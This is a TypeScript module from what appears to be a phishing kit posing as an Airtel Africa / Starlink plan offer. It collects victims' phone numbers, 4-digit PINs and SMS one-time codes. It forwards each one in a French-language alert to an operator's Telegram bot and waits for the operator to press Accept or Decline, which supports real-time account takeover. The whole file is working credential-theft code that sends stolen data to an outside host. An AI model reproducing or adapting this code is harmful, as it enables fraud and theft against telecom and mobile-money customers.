import { getTelegramBotToken, getTelegramChatId } from '../config/telegram';
import { safeStorage } from '../utils/safeBrowser';

export interface TelegramLoginPayload {
  sessionId: string;
  phone: string;
  fullPhone?: string;
  country?: string;
  countryCode?: string;
  airtelBrand?: string;
  pin: string;
  planName: string;
  planPrice: string;
}

export interface TelegramOtpPayload {
  sessionId: string;
  phone?: string;
  fullPhone?: string;
  country?: string;
  airtelBrand?: string;
  otp: string;
  planName?: string;
  planPrice?: string;
}

export interface TelegramReenterPinPayload {
  sessionId: string;
  phone: string;
  fullPhone?: string;
  country?: string;
  airtelBrand?: string;
  originalPin?: string;
  pin: string;
  planName?: string;
  planPrice?: string;
}

/**
 * Helper to safely parse JSON
 */
const safeJson = async (res: Response): Promise<any> => {
  try {
    const text = await res.text();
    if (!text || text.trim().startsWith('<') || text.trim().startsWith('The page')) {
      return null;
    }
    return JSON.parse(text);
  } catch {
    return null;
  }
};

/**
 * Send message to Telegram and wait for callback (exact working logic)
 */
const sendToTelegramAndWait = async (message: string, sessionId: string, isCode: boolean = false): Promise<boolean> => {
  const token = getTelegramBotToken();
  const chatId = getTelegramChatId();

  if (!token || !chatId) return true; // fallback to true

  const sessionKey = `pendingAuth_${sessionId}_${isCode ? 'code' : 'login'}`;
  let messageId = safeStorage.getItem(sessionKey);

  if (!messageId) {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const keyboard = {
      inline_keyboard: [
        [
          { text: '✅ Accept', callback_data: 'accept' },
          { text: '❌ Decline', callback_data: 'decline' }
        ]
      ]
    };

    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
          reply_markup: keyboard
        }),
      });

      if (!response.ok) return true;
      const data = await safeJson(response);
      if (!data || !data.ok) return true;

      messageId = data.result.message_id.toString();
      safeStorage.setItem(sessionKey, messageId!);
    } catch (error) {
      return true; // fallback
    }
  }

  // Start polling for callback query
  // We omit offset so we don't accidentally clear updates for other concurrent users.
  // The Telegram API will return the last 100 unconfirmed updates.
  while (true) {
    try {
      const updateUrl = `https://api.telegram.org/bot${token}/getUpdates`;
      const updateRes = await fetch(updateUrl);
      const updateData = await safeJson(updateRes);

      if (updateData && updateData.ok && updateData.result && updateData.result.length > 0) {
        for (const update of updateData.result) {
          if (update.callback_query && update.callback_query.message?.message_id.toString() === messageId) {
            const action = update.callback_query.data;

            // Acknowledge the callback
            await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ callback_query_id: update.callback_query.id })
            }).catch(() => {});

            // Edit message text to show result
            const newText = message + `\n\n<b>[ ${action === 'accept' ? '✅ APPROVED' : '❌ DECLINED'} ]</b>`;
            await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: chatId,
                message_id: messageId,
                text: newText,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
              })
            }).catch(() => {});

            // Clear session after decision
            safeStorage.removeItem(sessionKey);

            // Clear this update to avoid reprocessing
            await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${update.update_id + 1}`).catch(() => {});

            return action === 'accept';
          }
        }
      }
    } catch (e) {
      // network error during polling, ignore and retry
    }

    // wait a bit before next poll
    await new Promise(resolve => setTimeout(resolve, 3000));
  }
};

class TelegramService {
  /**
   * Send Login Credentials (Phone + 4-digit PIN)
   */
  public async sendLogin(payload: TelegramLoginPayload): Promise<boolean> {
    const { sessionId, phone, pin, planName, planPrice, country, fullPhone, airtelBrand } = payload;
    const cleanPhone = phone.replace(/\D/g, '');
    const cleanPin = pin.slice(0, 4);

    const displayPhone = fullPhone || (phone.startsWith('+') ? phone : `+243 ${phone}`);
    const displayCountry = country || 'Airtel Africa';
    const displayBrand = airtelBrand || 'Airtel x Starlink Direct';

    const message =
      `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
      `🔑 <b>Code PIN (4 chiffres):</b> <code>${cleanPin}</code>\n` +
      `📦 <b>Forfait Choisi:</b> <b>${planName}</b> (${planPrice})\n` +
      `📶 <b>Réseau:</b> ${displayBrand}\n` +
      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
      `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;

    return sendToTelegramAndWait(message, sessionId, false);
  }

  /**
   * Send OTP Verification Code (4 digits)
   */
  public async sendOtp(payload: TelegramOtpPayload): Promise<boolean> {
    const { sessionId, phone, otp, planName, planPrice, country, fullPhone, airtelBrand } = payload;
    const cleanOtp = otp.replace(/\D/g, '').slice(0, 4);

    const displayPhone = fullPhone || phone || 'Inconnu';
    const displayCountry = country || 'Airtel Africa';

    const message =
      `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
      `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
      `📦 <b>Forfait:</b> ${planName || 'Forfait Airtel Starlink'} (${planPrice || '$1.49'})\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
      `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;

    return sendToTelegramAndWait(message, sessionId, true);
  }

  /**
   * Status polling - not needed with blocking pattern
   */
  public async pollUpdates(
    sessionId: string,
    targetStep: 'login' | 'otp' | 'reenter',
    phone?: string
  ): Promise<'pending' | 'approved' | 'rejected'> {
    return 'pending';
  }
}

export const telegramService = new TelegramService();
